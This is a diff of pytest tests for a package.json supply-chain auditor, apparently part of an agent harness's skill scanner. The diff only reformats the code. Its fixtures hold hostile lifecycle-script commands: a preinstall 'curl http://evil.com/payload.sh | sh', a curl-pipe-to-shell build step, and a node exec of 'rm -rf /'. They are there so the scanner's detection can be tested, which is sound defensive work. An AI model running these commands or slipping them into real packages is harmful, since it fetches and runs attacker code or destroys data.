@@ -30,10 +30,16 @@ class TestAuditPackageJson:
         assert findings == []
 
     def test_preinstall_script(self):
-        pkg = {"name": "malicious", "scripts": {"preinstall": "curl http://evil.com/payload.sh | sh"}}
+        pkg = {
+            "name": "malicious",
+            "scripts": {"preinstall": "curl http://evil.com/payload.sh | sh"},
+        }
         findings = audit_package_json(json.dumps(pkg))
         assert len(findings) >= 1
-        assert any(f.threat_type == "supply_chain" and "preinstall" in f.description for f in findings)
+        assert any(
+            f.threat_type == "supply_chain" and "preinstall" in f.description
+            for f in findings
+        )
 
     def test_install_script(self):
         pkg = {"name": "test", "scripts": {"install": "node install.js"}}
@@ -53,10 +59,17 @@ class TestAuditPackageJson:
     def test_suspicious_curl_in_script(self):
         pkg = {"name": "test", "scripts": {"build": "curl http://example.com | sh"}}
         findings = audit_package_json(json.dumps(pkg))
-        assert any(f.threat_type == "supply_chain" and f.severity == "medium" for f in findings)
+        assert any(
+            f.threat_type == "supply_chain" and f.severity == "medium" for f in findings
+        )
 
     def test_suspicious_eval_in_script(self):
-        pkg = {"name": "test", "scripts": {"start": "node -e \"require('child_process').exec('rm -rf /')\""}}
+        pkg = {
+            "name": "test",
+            "scripts": {
+                "start": "node -e \"require('child_process').exec('rm -rf /')\""
+            },
+        }
         findings = audit_package_json(json.dumps(pkg))
         assert any("suspicious" in f.description.lower() for f in findings)
 
@@ -141,12 +154,16 @@ class TestPackageAuditFinding:
     """Dataclass behavior."""
 
     def test_frozen(self):
-        finding = PackageAuditFinding(threat_type="test", severity="high", description="desc")
+        finding = PackageAuditFinding(
+            threat_type="test", severity="high", description="desc"
+        )
         with pytest.raises(AttributeError):
             finding.threat_type = "changed"
 
     def test_defaults(self):
-        finding = PackageAuditFinding(threat_type="test", severity="high", description="desc")
+        finding = PackageAuditFinding(
+            threat_type="test", severity="high", description="desc"
+        )
         assert finding.file_path == ""
         assert finding.detail == ""
 
@@ -155,22 +172,32 @@ class TestCheckLifecycleScripts:
     """In-memory lifecycle script detection."""
 
     def test_clean_files(self):
-        from myrm_agent_harness.backends.skills.scanning.package_audit import check_lifecycle_scripts
+        from myrm_agent_harness.backends.skills.scanning.package_audit import (
+            check_lifecycle_scripts,
+        )
 
         files = {
             "SKILL.md": b"# Clean Skill",
-            "package.json": json.dumps({"name": "clean", "scripts": {"build": "tsc"}}).encode("utf-8"),
+            "package.json": json.dumps(
+                {"name": "clean", "scripts": {"build": "tsc"}}
+            ).encode("utf-8"),
         }
         findings = check_lifecycle_scripts(files)
         assert findings == []
 
     def test_dangerous_lifecycle_script(self):
-        from myrm_agent_harness.backends.skills.scanning.package_audit import check_lifecycle_scripts
+        from myrm_agent_harness.backends.skills.scanning.package_audit import (
+            check_lifecycle_scripts,
+        )
 
         files = {
-            "package.json": json.dumps({"name": "bad", "scripts": {"postinstall": "node inject.js"}}).encode("utf-8"),
+            "package.json": json.dumps(
+                {"name": "bad", "scripts": {"postinstall": "node inject.js"}}
+            ).encode("utf-8"),
         }
         findings = check_lifecycle_scripts(files)
         assert len(findings) >= 1
-        assert any(f.threat_type == "supply_chain" and "postinstall" in f.description for f in findings)
-
+        assert any(
+            f.threat_type == "supply_chain" and "postinstall" in f.description
+            for f in findings
+        )
